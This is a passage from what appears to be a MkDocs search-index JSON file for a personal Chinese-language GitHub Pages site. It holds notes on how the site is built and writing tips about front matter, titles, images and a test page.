\u4e2a\u4eba\u4ecb\u7ecd</p>"},{"location":"WEBSITE/build/","title":"\u7f51\u7ad9\u6784\u5efa\u8bf4\u660e","text":""},{"location":"WEBSITE/build/#_2","title":"\u4ecb\u7ecd","text":"<p>\u6211\u4f7f\u7528 Material for MkDocs \u5c06 <code>Markdown\u6587\u4ef6</code> \u6e32\u67d3\u4e3a <code>HTML\u7f51\u9875</code> \u5e76\u4f7f\u7528 <code>GitHub Pages</code> \u8fdb\u884c\u53d1\u5e03</p> <p>Material for MkDocs \u6587\u6863</p>"},{"location":"WEBSITE/build/#_3","title":"\u4ed3\u5e93","text":"<p>\u6b64\u7f51\u7ad9\u7684 Markdown\u6e90\u6587\u4ef6 \u5b58\u50a8\u5728 AnistonH/AnistonH.github.io</p> <p>\u5982\u679c\u4f60\u5e0c\u671b\u63d0\u51fa\u4e00\u4e9b\u5efa\u8bae\uff0c\u53ef\u4ee5\uff1a</p> <ul> <li>\u5728 Issues \u677f\u5757\u63d0\u51fa\u95ee\u9898</li> <li>\u5728 Pull Requests \u677f\u5757\u4fee\u6539\u6e90\u6587\u4ef6</li> <li>\u70b9\u51fb\u6587\u7ae0\u6807\u9898\u53f3\u4fa7\u7684\u7f16\u8f91\u6309\u94ae\u5bf9\u6587\u7ae0\u8fdb\u884c\u4fee\u6539</li> </ul>"},{"location":"WEBSITE/help/","title":"\u6587\u7ae0\u7f16\u5199\u5e2e\u52a9","text":""},{"location":"WEBSITE/help/#_2","title":"\u8bed\u8a00\u652f\u6301","text":"<p>\u5e76\u4e0d\u652f\u6301\u82f1\u6587\uff0c\u56e0\u4e3a\u6587\u7ae0\u4e3b\u8981\u4f7f\u7528\u4e2d\u6587\uff0c\u8bbf\u95ee\u8005\u662f\u4e2d\u56fd\u4eba\u3002</p>"},{"location":"WEBSITE/help/#index","title":"index","text":"<p>\u6700\u5f00\u59cb\u6253\u5f00\u7f51\u7ad9\uff0c\u4e5f\u5c31\u662f\u901a\u8fc7\u94fe\u63a5 https://AnistonH.github.io/ \u8bbf\u95ee\u65f6\uff0c\u4f1a\u5148\u6253\u5f00 <code>/docs/index.md</code>\uff0c\u8fd9\u65f6\u8bbf\u95ee\u8005\u70b9\u51fb\u5de6\u4e0a\u89d2\u6309\u94ae\u5c55\u5f00\u76ee\u5f55\u4f1a\u5148\u770b\u5230\u5927\u7684\u5206\u7c7b\u3002</p> <p>\u56e0\u4e3a\u4e0d\u5e0c\u671b\u7528\u6237\u4e4b\u540e\u627e\u4e0d\u5230\u8fd9\u4e2a\u9875\u9762\uff0c\u6240\u4ee5 <code>/docs/WEBSITE/index.md</code> \u4e0b\u9762\u7684\u5185\u5bb9\u4e0e <code>/docs/index.md</code> \u7684\u5185\u5bb9\u4e00\u81f4\u3002</p> <p>\u6bcf\u4e2a nav \u7684 tab \u4e0b\u6709\u4e00\u4e2a <code>index.md</code>\uff0c\u70b9\u51fb tab \u4f1a\u5148\u8df3\u8f6c\u5230\u8fd9\u4e9b <code>index.md</code>\u3002</p> <p>\u6240\u4ee5 \u5982\u4e0b\u63d0\u793a\u53ef\u4ee5\u5ffd\u7565\uff1a</p> Text Only<pre><code>INFO - The following pages exist in the docs directory, but are not included in the \"nav\" configuration:\n     - index.md\n</code></pre>"},{"location":"WEBSITE/help/#metadata","title":"metadata","text":"Text Only<pre><code>---\ntitle: &lt;title&gt;\ndescription: &lt;description&gt;\ntags:\n  - &lt;tag1&gt;\n  - &lt;tag2&gt;\n---\n</code></pre>"},{"location":"WEBSITE/help/#title","title":"title","text":"<p>\u6709\u4e09\u4e2a\u6807\u9898:</p> <ul> <li><code>nav-title</code>: \u5728 <code>mkdocs.yml</code> \u7684 <code>nav</code> \u4e2d\u6307\u5b9a\u7684\u6807\u9898<ul> <li>\u5bfc\u822a\u65f6\u663e\u793a\u7684\u6807\u9898\uff0c\u53ef\u4ee5\u56e0\u4e3a\u5c42\u6b21\u7ed3\u6784\u800c\u7701\u7565\u3002</li> </ul> </li> <li><code>meta-title</code>: \u6587\u7ae0\u5728\u6700\u4e0a\u65b9\u901a\u8fc7 <code>---</code> \u6bb5\u8bbe\u7f6e\u7684\u6807\u9898<ul> <li>\u4e0b\u6ed1\u540e\u51fa\u73b0\u7684\u6807\u9898\u4e3a\u6b64\u6807\u9898\u3002</li> </ul> </li> <li><code>h1-title</code>: \u6587\u7ae0\u7b2c\u4e00\u4e2a <code>#</code> \u6807\u9898<ul> <li>\u53ea\u80fd\u6709\u4e00\u4e2a\uff0c\u6216\u8005\u6574\u7bc7\u6587\u7ae0\u90fd\u6ca1\u6709 \u53c2\u8003\uff0c\u5426\u5219\u53f3\u4fa7\u76ee\u5f55\u65e0\u6cd5\u6b63\u5e38\u663e\u793a\u3002</li> <li>\u5982\u679c\u8bbe\u7f6e\u4e86 <code>---</code> \u6bb5\u7684\u6807\u9898\uff0c\u53ef\u4ee5\u4e0d\u4f7f\u7528\u3002</li> <li>\u5982\u679c\u672a\u8bbe\u7f6e <code>---</code> \u6bb5\u7684\u6807\u9898\uff0c\u4e0b\u6ed1\u540e\u51fa\u73b0\u7684\u6807\u9898\u4e3a nav \u7684\u6807\u9898\u3002</li> <li>\u5982\u679c\u6ca1\u6709\u8fd9\u4e2a\u6807\u9898\uff0c\u4f1a\u81ea\u52a8\u5c06 nav \u7684\u6807\u9898\u62ff\u8fc7\u6765\u3002</li> </ul> </li> </ul> <p>\u63a8\u8350\u7684\u4f7f\u7528\u65b9\u6cd5\u662f\uff0c\u8bbe\u7f6e\u7b80\u6d01\u7684 <code>nav-title</code> \u7528\u6765\u5bfc\u822a\uff0c<code>meta-title</code> \u548c <code>h1-title</code> \u4f7f\u7528\u76f8\u540c\u7684\u6807\u9898\u8868\u8ff0\u6587\u7ae0\u5185\u5bb9\u3002\u6216\u8005\u53ea\u8bbe\u7f6e <code>h1-title</code>\u3002</p>"},{"location":"WEBSITE/help/#_3","title":"\u56fe\u7247","text":"Text Only<pre><code>![](./media/xxx.png){width=\"300\"}\n\n![](./media/xxx.png){width=\"50%\"}\n</code></pre> <p>\u6ce8\u610f:</p> <ul> <li>\u6709\u4e9b\u5916\u94fe\u56fe\u7247\u6ca1\u6709 token \u662f\u65e0\u6cd5\u76f4\u63a5\u83b7\u53d6\u7684\u3002</li> <li>\u5982\u679c\u5e0c\u671b\u56fe\u7247\u5e76\u6392\uff0c\u5220\u6389\u4e24\u4e2a\u56fe\u7247\u4e2d\u95f4\u7684\u7a7a\u884c\u3002</li> </ul>"},{"location":"WEBSITE/test/","title":"\u6d4b\u8bd5\u6587\u6863","text":"<p>Here is an inline example, </p> <p>https://github.com/AnistonH/AnistonH.github.io</p> <p>Tip</p> <p>JUST A TEST</p> <p>Warning</p> <p>JUST A TEST</p> <p>Danger</p> <p>JUST A TEST</p> <p>Info</p> <p>JUST A TEST</p> <p>Success</p> <p>JUST A TEST</p> <p>Question</p> <p>JUST A TEST</p> <p>Note</p> <p>JUST A TEST</p>"}]}